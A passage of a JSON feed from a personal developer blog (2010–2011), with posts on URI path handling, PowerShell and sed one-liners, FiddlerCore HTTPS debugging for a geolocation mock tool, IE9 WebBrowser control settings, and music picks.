			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Last time I wrote about how <a href=\"http://deletethis.net/dave/?uri=http%3A%2F%2Fdavescoolblog.blogspot.com%2F2011%2F11%2Freplacing-delicious-with-google-reader.html\">I switched from Delicious\n    to Google Reader's shared links feature</a> only to find out that week that <a href=\"http://googlereader.blogspot.com/2011/10/upcoming-changes-to-reader-new-look-new.html\">Google was removing the\n    Google Reader shared links feature</a> in favor of Google Plus social features (I'll save my Google Plus rant for another day).\n  </p><p>\n    Forced to find something new again, I'm now very pleased with <a href=\"http://sequelguy.tumblr.com/\">Tumblr</a>. Google Reader has Tumblr in its preset list of Send To sites which makes it\n    relatively easy to add articles. And Tumblr's UX for adding things lets me easily pick a photo or video to display from the article - something which I had put together with a less convenient UX\n    on my bespoke blogging system. For adding things outside of Google Reader I made a <a href=\"http://deletethis.net/dave/activity/\">Tumblr accelerator</a> to hookup to the Tumblr Add UX.\n  </p><p>\n    Of course they have an RSS feed which I hooked up to my blog. The only issue I had there is that when you add a link (and not a video or photo) to Tumblr, the RSS feed entry title for that link\n    is repeated in the entry description as a link followed by a colon and then the actual description entered into Tumblr. I want my title separate so I can apply my own markup so I did a bit of\n    parsing of the description to remove the repeated title from the description.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-9044142281140853902?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-11-28T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-11/URI+Empty+Path+Segments+Matter/",
			"url": "https://deletethis.net/dave/2011-11/URI+Empty+Path+Segments+Matter/",
			"title": "URI Empty Path Segments Matter",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Shortly after joining the Internet Explorer team I got a bug from a PM on a popular Microsoft web server product that I'll leave unnamed (from now on UWS). The bug said that IE was handling empty\n    path segments incorrectly by not removing them before resolving dotted path segments. For example UWS would do the following:\n  </p><pre><code>A.1. http://example.com/a/b//../<br>A.2. http://example.com/a/b/../<br>A.3. http://example.com/a/</code></pre>In step 1 they are given a URI with dotted path segment and an empty\n  path segment. In step 2 they remove the empty path segment, and in step 3 they resolve the dotted path segment. Whereas, given the same initial URI, IE would do the following:\n  <pre><code>B.1. http://example.com/a/b//../<br>B.2. http://example.com/a/b/</code></pre>IE simply resolves the dotted path segment against the empty path segment and removes them both. So, how\n  did I resolve this bug? As \"By Design\" of course!\n  <p>\n    The URI RFC allows path segments of zero length and does not assign them any special meaning. So generic user agents that intend to work on the web must not treat an empty path segment any\n    different from a path segment with some text in it. In the case above IE is doing the correct thing.\n  </p><p>\n    That's the case for generic user agents, however servers may decide that a URI with an empty path segment returns the same resource as a the same URI without that empty path segment. Essentially\n    they can decide to ignore empty path segments. Both IIS and Apache work this way and thus return the same resource for the following URIs:\n  </p><pre><code>http://exmaple.com/foo//bar///baz<br>http://example.com/foo/bar/baz</code></pre>The issue for UWS is that it removes empty path segments before resolving dotted path segments. It must\n  follow normal URI procedure before applying its own additional rules for empty path segments. Not doing that means they end up violating URI equivalency rules: URIs (A.1) and (B.2) are equivalent\n  but UWS will not return the same resource for them.\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-7528293767818521387?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-11-23T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-11/Features+of+image+type+input+tags+in+HTML/",
			"url": "https://deletethis.net/dave/2011-11/Features+of+image+type+input+tags+in+HTML/",
			"title": "Features of image type input tags in HTML",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    A bug came up the other day involving markup containing <code>&lt;input type=\"image\" src=\"http://example.com/...</code>. I knew that \"image\" was a valid input type but it wasn't until that moment\n    that I realized I didn't know what it did. Looking it up I found that it displays the specified image and when the user clicks on the image, the form is submitted with an additional two name\n    value pairs: the x and y positions of the point at which the user clicked the image.\n  </p><p>\n    Take for example the following HTML:\n  </p><pre><code>&lt;form action=\"http://example.com/\"&gt;<br>&lt;input type=\"image\" name=\"foo\" src=\"http://deletethis.net/dave/images/davebefore.jpg\"&gt;<br>&lt;/form&gt;</code></pre>If the user\n  clicks on the image, the browser will submit the form with a URI like the following:<code>http://example.com/?foo.x=145&amp;foo.y=124</code>.\n  <p>\n    This seemed like an incredibly specific feature to be built directly into the language when this could instead be done with javascript. I looked a bit further and saw that its been in HTML since\n    at least <a href=\"http://tools.ietf.org/html/rfc1866#section-8.1.2.5\">HTML2</a>, which of course makes much more sense. Javascript barely existed at that point and sending off the user's click\n    location in a form may have been the only way to do something interesting with that action.\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-3312444837591781292?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-11-21T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-11/Replacing+Delicious+with+Google+Reader/",
			"url": "https://deletethis.net/dave/2011-11/Replacing+Delicious+with+Google+Reader/",
			"title": "Replacing Delicious with Google Reader",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I had previously replaced my use of Delicious with Google Reader. Delicious had a number of issues during their switch over from Yahoo to the new owners and I was eventually fed up enough to\n    remove it from daily use. I used Delicious to do the following things:\n  </p><ul><li>Create a list of things to read later\n    </li><li>Save things to read again in the future\n    </li><li>Search through things I read and enjoyed (esp via tags)\n    </li><li>Annotate and share things on my blog\n    </li></ul>I realized that since I did most of my web browsing in Google Reader now anyway I may as well make use of its features. I star things to note I want to read it later or save to read again\n  later. I can annotate with notes in Google Reader and I can share items to my web site by way of the shared items feed. Additionally for when I'm not in Google Reader there's a bookmarklet to add\n  an arbitrary web site as a shared item in Google Reader.\n  <p>\n    Of course I wrote this and switched over about 1 week before Google removed the sharing feature from Google Reader. I'm irritated but in practice it forced me to find a different option which has\n    worked out mostly better. New blog post coming soon about that...\n  </p><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-2814590637980996314?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-11-17T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-10/Haven-t+Been+Posting+Much/",
			"url": "https://deletethis.net/dave/2011-10/Haven-t+Been+Posting+Much/",
			"title": "Haven&#39;t Been Posting Much",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  I haven't been updating my blog recently. But I have three excellent reasons:\n  <ul><li>The manner in which I use <a href=\"http://www.zdnet.com/blog/violetblue/avos-delicious-disaster-lessons-from-a-complete-failure/705\">Delicious is broken</a>.\n    </li><li>I've been playing <a href=\"http://www.glitch.com/\">Glitch</a> instead of reading through Google Reader.\n    </li><li>I have a <a href=\"http://deletethis.net/dave/?q=alex&amp;link=off&amp;blog=off\">newborn</a>!\n    </li></ul><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-8415347365327737430?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-10-18T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-06/WPAD+Server+Fiddler+Extension+Update+v1.0.1/",
			"url": "https://deletethis.net/dave/2011-06/WPAD+Server+Fiddler+Extension+Update+v1.0.1/",
			"title": "WPAD Server Fiddler Extension Update v1.0.1",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  As it turns out the <a href=\"http://deletethis.net/dave/wpadserverfiddlerextension/\">WPAD Server Fiddler Extension</a> I made <a href=\"http://deletethis.net/dave/?uri=http%3A%2F%2Fcerealnumber.livejournal.com%2F51588.html\">a while back</a> actually has a non-malicious purpose. Apparently its useful for debugging HTTP on the WP7\n  phone (or so I'm told). Anyway I took some requests and I've fixed a few minor bugs (start button not updating correctly), changed the dialog to be a Fiddler tab so you can use it non-modally, and\n  the WPAD server is now always off when Fiddler starts.\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-5014136890216967288?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-06-12T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-05/Command+line+for+finding+missing+URLACTIONs/",
			"url": "https://deletethis.net/dave/2011-05/Command+line+for+finding+missing+URLACTIONs/",
			"title": "Command line for finding missing URLACTIONs",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I wanted to ensure that my switch statement in my implementation of IInternetSecurityManager::ProcessURLAction had a case for every possible documented URLACTION. I wrote the following short\n    command line sequence to see the list of all URLACTIONs in the SDK header file not found in my source file:\n  </p><pre><code>grep URLACTION urlmon.idl | sed 's/.*\\(URLACTION[a-zA-Z0-9_]*\\).*/\\1/g;' | sort | uniq &gt; allURLACTIONs.txt<br>grep URLACTION MySecurityManager.cpp | sed 's/.*\\(URLACTION[a-zA-Z0-9_]*\\).*/\\1/g;' | sort | uniq &gt; myURLACTIONs.txt<br>comm -23 allURLACTIONs.txt myURLACTIONs.txt</code></pre>I'm\n  not a sed expert so I had to read the <a href=\"http://www.gnu.org/software/sed/manual/sed.html\">sed documentation</a>, and I heard about <a href=\"http://askawizard.blogspot.com/2008/01/some-handy-commands.html\">comm from Kris Kowal's blog</a> which happilly was in the <a href=\"http://unxutils.sourceforge.net/\">Win32 GNU tools pack</a> I\n  already run.\n  <p>\n    But in my effort to learn and use PowerShell I found the following similar command line:\n  </p><pre><code>diff <br>(more urlmon.idl | %{ if ($_ -cmatch \"URLACTION[a-zA-Z0-9_]*\") { $matches[0] } } | sort -uniq) <br>(more MySecurityManager.cpp | %{ if ($_ -cmatch \"URLACTION[a-zA-Z0-9_]*\") { $matches[0] } } | sort -uniq)</code></pre>In\n  the PowerShell version I can skip the temporary files which is nice. 'diff' is mapped to 'compare-object' which seems similar to comm but with no parameters to filter out the different streams\n  (although this could be done more verbosely with the ?{ } filter syntax). In PowerShell uniq functionality is built into sort. The builtin -cmatch operator (c is for case sensitive) to do regexp is\n  nice plus the side effect of generating the $matches variable with the regexp results.\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-4657842629995936098?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-05-28T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-05/clip.exe+-+Useful+tool+I+didn-t+know+shipped+with+Windows/",
			"url": "https://deletethis.net/dave/2011-05/clip.exe+-+Useful+tool+I+didn-t+know+shipped+with+Windows/",
			"title": "clip.exe - Useful tool I didn&#39;t know shipped with Windows",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    When you run clip.exe, whatever comes into its standard input is put onto the clipboard. So when you need to move the result of something in your command window somewhere else you can pipe the\n    result into clip.exe. Then you won't have to worry about the irritating way cmd.exe does block copy/pasting and you avoid having to manually fixup line breaks in wrapped lines. For instance, you\n    can put the contents of a script into the clipboard with:\n  </p><pre><code>more cdo.cmd | clip</code></pre><p>\n    I've got a lot of stuff dumped in my bin folder that I sync across all my PCs so I didn't realize that clip.exe is a part of standard Windows installs.\n  </p><p>\n    Nice for avoiding the block copy in cmd.exe but I'd prefer to have the contents sort of tee'd into the clipboard and standard output. So TeeClip.ps1:\n  </p><pre><code>$input | tee -var teeclipout | clip;<br>$teeclipout;</code></pre><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-429703209805729186?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-05-26T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-05/_opt+Mnemonic/",
			"url": "https://deletethis.net/dave/2011-05/_opt+Mnemonic/",
			"title": "_opt Mnemonic",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    ​I always have trouble remembering where the opt goes in <a href=\"http://msdn.microsoft.com/en-us/library/aa383701(VS.85).aspx\">SAL</a> in the __deref_out case. The mnemonic is pretty simple: the\n    _opt at the start of the SAL is for the pointer value at the start of the function. And the _opt at the end of the SAL is for the dereferenced pointer value at the end of the function.\n  </p><br><br><br><br><br><table><tr><th>\n        SAL\n      </th><th>\n        foo == nullptr allowed at function start?\n      </th><th>\n        *foo == nullptr allowed at function end?\n      </th></tr><tr><td>\n        __deref_out void **foo\n      </td><td>\n        No\n      </td><td>\n        No\n      </td></tr><tr><td>\n        __deref<b>_opt</b>_out void **foo\n      </td><td>\n        Yes\n      </td><td>\n        No\n      </td></tr><tr><td>\n        __deref_out<b>_opt</b> void **foo\n      </td><td>\n        No\n      </td><td>\n        Yes\n      </td></tr><tr><td>\n        __deref<b>_opt</b>_out<b>_opt</b> void **foo\n      </td><td>\n        Yes\n      </td><td>\n        Yes\n      </td></tr></table>.\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-8290674282470951917?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-05-24T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-05/PowerShell+Script+Batch+File+Wrapper/",
			"url": "https://deletethis.net/dave/2011-05/PowerShell+Script+Batch+File+Wrapper/",
			"title": "PowerShell Script Batch File Wrapper",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I'm trying to learn and use PowerShell more, but plenty of other folks I know don't use PowerShell. To allow them to use my scripts I use the following cmd.exe batch file to make it easy to call\n    PowerShell scripts. To use, just name the batch file name the same as the corresponding PowerShell script filename and put it in the same directory.<br></p><pre><code>@echo off<br>if \"%1\"==\"/?\" goto help<br>if \"%1\"==\"/h\" goto help<br>if \"%1\"==\"-?\" goto help<br>if \"%1\"==\"-h\" goto help<br><br>%systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe -ExecutionPolicy RemoteSigned -Command . %~dpn0.ps1 %*<br>goto end<br><br>:help<br>%systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe -ExecutionPolicy RemoteSigned -Command help %~dpn0.ps1 -full<br>goto end<br><br>:end</code></pre><p>\n    Additionally for PowerShell scripts that modify the current working directory I use the following batch file:\n  </p><pre><code>@echo off<br>if \"%1\"==\"/?\" goto help<br>if \"%1\"==\"/h\" goto help<br>if \"%1\"==\"-?\" goto help<br>if \"%1\"==\"-h\" goto help<br><br>%systemroot%\\system32\\windowspowershell\\v1.0\\powershell.exe -ExecutionPolicy RemoteSigned -Command . %~dpn0.ps1 %*;(pwd).Path 1&gt; %temp%\\%~n0.tmp 2&gt; nul<br>set /p newdir=</code></pre></div></div>\n",
			"date_published": "2011-05-22T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-04/Capturing+HTTPS+with+FiddlerCore/",
			"url": "https://deletethis.net/dave/2011-04/Capturing+HTTPS+with+FiddlerCore/",
			"title": "Capturing HTTPS with FiddlerCore",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I used <a href=\"http://fiddler.wikidot.com/fiddlercore\">FiddlerCore</a> in <a href=\"http://deletethis.net/dave/dev/geolocmock/\">GeolocMock</a> to edit HTTPS responses and ran into two stumbling\n    blocks that I'll document here. The first is that I didn't check if the Fiddler root cert existed or was installed, which of course is necessary to edit HTTPS traffic. The following is my code\n    where I check for the certs.\n  </p><pre><code>    if (!Fiddler.CertMaker.rootCertExists())<br>    {<br>        if (!Fiddler.CertMaker.createRootCert())<br>        {<br>            throw new Exception(\"Unable to create cert for FiddlerCore.\");<br>        }<br>    }<br><br>    if (!Fiddler.CertMaker.rootCertIsTrusted())<br>    {<br>        if (!Fiddler.CertMaker.trustRootCert())<br>        {<br>            throw new Exception(\"Unable to install FiddlerCore's cert.\");<br>        }<br>    }</code></pre><p>\n    The second problem I had (which would have been solved had I read all the sample code first) was that my changes weren't being applied. In my app I only need the BeforeResponse but in order to\n    modify the response I must also sign up for the BeforeRequest event and mark the bBufferResponse flag on the session before the response comes back. For example:\n  </p><pre><code>    Fiddler.FiddlerApplication.BeforeRequest += new SessionStateHandler(FiddlerApplication_BeforeRequest);<br>    Fiddler.FiddlerApplication.BeforeResponse += new SessionStateHandler(FiddlerApplication_BeforeResponse);<br>...<br>    private void FiddlerApplication_BeforeRequest(Session oSession)<br>    {<br>        if (IsInterestingSession(oSession))<br>        {<br>            oSession.bBufferResponse = true;<br>        }<br>    }</code></pre><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-375553475007025353?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-04-06T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-04/JavaScript+-+.NET+interop+via+WebBrowser+Control/",
			"url": "https://deletethis.net/dave/2011-04/JavaScript+-+.NET+interop+via+WebBrowser+Control/",
			"title": "JavaScript &amp; .NET interop via WebBrowser Control",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    For my <a href=\"http://deletethis.net/dave/dev/geolocmock/\">GeolocMock</a> weekend project I intended to use the Bing Maps API to display a map in a WebBrowser control and allow the user to\n    interact with that to select a location to be consumed by my application. Getting my .NET code to talk to the JavaScript in the WebBrowser control was surprisingly easy.\n  </p><p>\n    To have .NET execute JavaScript code you can use the InvokeScript method passing the name of the JavaScript function to execute and an object array of parameters to pass:\n  </p><pre><code>this.webBrowser2.Document.InvokeScript(\"onLocationStateChanged\",<br>   new object[] {<br>      latitudeTextBoxText,<br>      longitudeTextBoxText,<br>      altitudeTextBoxText,<br>      uncertaintyTextBoxText<br>   });</code></pre><p>\n    The other direction, having JavaScript call into .NET is slightly more complicated but still pretty easy as far as language interop goes. The first step is to mark your assembly as ComVisible so\n    that it can interact with JavaScript via COM. VS had already added a ComVisible declaration to my project I just had to change the value to true.\n  </p><pre><code>[assembly: ComVisible(true)]</code></pre><p>\n    Next set ObjectForScripting attribute to the object you want to expose to JavaScript.\n  </p><pre><code>this.webBrowser2.ObjectForScripting = this.locationState;</code></pre><p>\n    Now that object is exposed as window.external in JavaScript and you can call methods on it.\n  </p><pre><code>window.external.Set(lat, long, alt, gUncert);</code></pre><p>\n    However you don't seem to be able to test for the existence of methods off of it. For example the following JavaScript generates an exception for me even though I have a Set method:\n  </p><pre><code>if (window.external &amp;&amp; window.external.Set) {</code></pre><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-1115399204951118616?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-04-05T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-04/IE9+Document+Mode+in+WebOC/",
			"url": "https://deletethis.net/dave/2011-04/IE9+Document+Mode+in+WebOC/",
			"title": "IE9 Document Mode in WebOC",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    Working on <a href=\"http://deletethis.net/dave/dev/geolocmock/\">GeolocMock</a> it took me a bit to realize why my HTML could use the W3C Geolocation API in IE9 but not in my WebBrowser control in\n    my .NET application. Eventually I realized that I was getting the wrong IE doc mode. Reading this old <a href=\"http://blogs.msdn.com/b/ie/archive/2009/03/10/more-ie8-extensibility-improvements.aspx\">More IE8 Extensibility Improvements IE</a> blog post from the IE blog I found the issue is that for app\n    compat the WebOC picks older doc modes but an app hosting the WebOC can set a regkey to get different doc modes. The IE9 mode isn't listed in that article but I took a guess based on the values\n    there and the decimal value 9999 gets my app IE9 mode. The following is the code I run in my application to set its regkey so that my app can get the IE9 doc mode and use the geolocation API.\n  </p><br><br><pre><code>        static private void UseIE9DocMode()<br>        {<br>            RegistryKey key = null;<br>            try<br>            {<br>                key = Registry.CurrentUser.OpenSubKey(\"Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\FeatureControl\\\\FEATURE_BROWSER_EMULATION\", true);<br>            }<br>            catch (Exception)<br>            {<br>                key = Registry.CurrentUser.CreateSubKey(\"Software\\\\Microsoft\\\\Internet Explorer\\\\Main\\\\FeatureControl\\\\FEATURE_BROWSER_EMULATION\");<br>            }<br>            key.SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, 9999, RegistryValueKind.DWord);<br>            key.Close();<br>        }</code></pre><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-7320694778093736225?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-04-04T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-04/GeolocMock+Tool+-+Tell+IE9+Where+You+Are/",
			"url": "https://deletethis.net/dave/2011-04/GeolocMock+Tool+-+Tell+IE9+Where+You+Are/",
			"title": "GeolocMock Tool - Tell IE9 Where You Are",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've made <a href=\"http://deletethis.net/dave/dev/geolocmock/\">GeolocMock</a>. If your PC has no geolocation devices, IE9 uses a webservice to determine your location. GeolocMock uses FiddlerCore\n    to intercept the response from the webservice and allows the user to replace the location in the response with another. This was a fun weekend project in order to play with <a href=\"http://fiddler.wikidot.com/fiddlercore\">FiddlerCore</a>, the <a href=\"http://blogs.msdn.com/b/ie/archive/2011/02/17/w3c-geolocation-api-in-ie9.aspx\">W3C Geoloc APIs in IE9</a>, hosting the IE9\n    WebOC in a .NET app, and the <a href=\"http://msdn.microsoft.com/en-us/library/gg427611.aspx\">Bing Maps APIs</a>.\n  </p><a href=\"http://deletethis.net/dave/dev/geolocmock/\"><img src=\"http://deletethis.net/dave/dev/geolocmock/screenshot.png\" width=\"216\" height=\"228\"></a><div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-4723417518145223507?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-04-03T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2011-02/Listen+to+Max+Tannone+and+Watch+Moon/",
			"url": "https://deletethis.net/dave/2011-02/Listen+to+Max+Tannone+and+Watch+Moon/",
			"title": "Listen to Max Tannone and Watch Moon",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><a href=\"http://www.maxtannone.com/\">Max Tannone</a> does awesome remix albums:<br><ul><br><li><a href=\"http://www.maxtannone.com/projects/jaydiohead/\"><img src=\"http://www.maxtannone.com/wp-content/uploads/2010/10/jaydiohead_full2-150x150.jpg\" width=\"150\" height=\"150\"></a>Jaydiohead -\n      Radiohead &amp; Jay-Z mashup. Listen:<br><object width=\"100%\" height=\"81\"><param name=\"movie\" value=\"http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F147259\"><param name=\"allowscriptaccess\" value=\"always\"><embed height=\"81\" type=\"application/x-shockwave-flash\" width=\"100%\" src=\"http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F147259\" allowscriptaccess=\"always\"></object><span><a href=\"http://soundcloud.com/maxtannone/jaydiohead-06-dirt-off-your-android\">Jaydiohead - 06 - Dirt Off Your Android</a> by <a href=\"http://soundcloud.com/maxtannone\">Max\n      Tannone</a></span></li><br><li><a href=\"http://www.seleneproject.com/\"><img src=\"http://www.seleneproject.com/Selene_EP_front_cover_web.jpg\" width=\"150\" height=\"150\"></a>Selene - Richard Rich &amp; beats over the Moon\n      soundtrack. Listen:<br><object width=\"100%\" height=\"81\"><param name=\"movie\" value=\"http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F10975440\"><param name=\"allowscriptaccess\" value=\"always\"><embed height=\"81\" type=\"application/x-shockwave-flash\" width=\"100%\" src=\"http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F10975440\" allowscriptaccess=\"always\"></object><span><a href=\"http://soundcloud.com/maxtannone/selene-01-you-are-here\">Selene - 01 - You Are Here</a> by <a href=\"http://soundcloud.com/maxtannone\">Max Tannone</a></span></li><br><li><a href=\"http://www.maxtannone.com/projects/dcyh/\"><img src=\"http://www.maxtannone.com/wp-content/uploads/2010/10/dcyh_cover_full-150x150.jpg\" width=\"150\" height=\"150\"></a>Double Check Your\n      Head - Beastie Boys albums mixed together. Listen:<br><object width=\"100%\" height=\"81\"><param name=\"movie\" value=\"http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F557454\"><param name=\"allowscriptaccess\" value=\"always\"><embed height=\"81\" type=\"application/x-shockwave-flash\" width=\"100%\" src=\"http://player.soundcloud.com/player.swf?url=http%3A%2F%2Fapi.soundcloud.com%2Ftracks%2F557454\" allowscriptaccess=\"always\"></object><span><a href=\"http://soundcloud.com/maxtannone/beastie-boys-02-pass-the-gratitude\">Beastie Boys - 02 - Pass The Gratitude</a> by <a href=\"http://soundcloud.com/maxtannone\">Max\n      Tannone</a></span><br></li><br></ul><br><a href=\"http://movies.netflix.com/WiMovie/Moon/70112500?trkid=2361637#height2210\"><img src=\"http://cdn-0.nflximg.com/en_US/boxshots/gsd/70112500.jpg\"></a><br>\n  Also, the movie <a href=\"http://movies.netflix.com/WiMovie/Moon/70112500?trkid=2361637#height2210\">Moon</a> is really good on a variety of points. Sam Rockwell and the voice of Kevin Spacey! Its\n  available on Netflix Watch Instantly so you have no excuse!\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-6032198445841527452?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2011-02-23T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2010-12/Ratatat+Rocks/",
			"url": "https://deletethis.net/dave/2010-12/Ratatat+Rocks/",
			"title": "Ratatat Rocks",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div>\n  I just found out that I like the group <a href=\"http://en.wikipedia.org/wiki/Ratatat\">Ratatat</a>. I'd first heard them way back when the Zune was first released as the backing for <a href=\"http://72andsunny.com/#/work/zune/zune_arts/film/los_corazones/\">Los Corazones</a> on the zune-arts.net website.<br><br><object width=\"480\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/lWK7rDJ2RKM?fs=1&amp;hl=en_US\"><param name=\"allowFullScreen\" value=\"true\"><param name=\"allowscriptaccess\" value=\"always\"><embed src=\"http://www.youtube.com/v/lWK7rDJ2RKM?fs=1&amp;hl=en_US\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"></object><br><br><br>\n  But I didn't know who they were until today when I watched this Filmography 2010 video (via <a href=\"http://kottke.org/10/12/the-year-in-film-2010\">Kottke</a>)<br><br><object width=\"640\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/I4dEWOB6THE?fs=1&amp;hl=en_US\"><param name=\"allowFullScreen\" value=\"true\"><param name=\"allowscriptaccess\" value=\"always\"><embed src=\"http://www.youtube.com/v/I4dEWOB6THE?fs=1&amp;hl=en_US\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"640\" height=\"385\"></object><br><br>\n  Until about 1:16 in, the music is <a href=\"http://www.youtube.com/watch?v=kVtGCACwpW8\">Ratatat's Nostrand</a>. On the first viewing it drove me crazy because I could only vaguely recall hearing\n  something like that music before. I tracked it down via the zune-arts thing above and eventually found my way to the Nostrand video. Funny, all the recent comments on that one are from people who\n  also just watched the Filmography video.\n  <div class=\"blogger-post-footer\"><img width=\"1\" height=\"1\" src=\"https://blogger.googleusercontent.com/tracker/1670048653123050463-8444228991627756294?l=davescoolblog.blogspot.com\" alt=\"\"></div></div></div>\n",
			"date_published": "2010-12-28T00:00:00Z"
		}
		,
		{
			"id": "https://deletethis.net/dave/2010-12/Console+Build+Window+Jump+Lists+Tool/",
			"url": "https://deletethis.net/dave/2010-12/Console+Build+Window+Jump+Lists+Tool/",
			"title": "Console Build Window Jump Lists Tool",
			"content_html": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><div><p>\n    I've made two simple command line tools related to the console window and Win7 jump lists. The source is available for both but neither is much more than the sort of samples you'd find on MSDN\n    =).\n  </p><ul><li><a href=\"http://deletethis.net/dave/dev/setappusermodelid/\">SetAppUserModelId</a></li><li><a href=\"http://deletethis.net/dave/dev/setjumplist/\">SetJumpList</a></li></ul><p>\n    SetAppUserModelId lets you change the Application User Model ID for the current console window. The AppUserModelId is the value Win7 uses to group together icons on the task bar and is what the\n    task bar's jump lists are associated with. The tool lets you change that as well as the icon and name that appear in the task bar for the window, and the command to launch if the user attempts to\n    re-launch the application from its task bar icon.\n  </p><p>\n    SetJumpList lets you set the jump list associated with a particular AppUserModelId. You pass the AppUserModelId as the only parameter and then in its standard input you give it lines specifying\n    items that should appear in the jump list and what to execute when those items are picked.\n  </p><p>\n    I put these together to make my build environment easier to deal with at work. I have to deal with multiple enlistments in many different branches and so I wrote a simple script around these two\n    tools to group my build windows by branch name in the task bar, and to 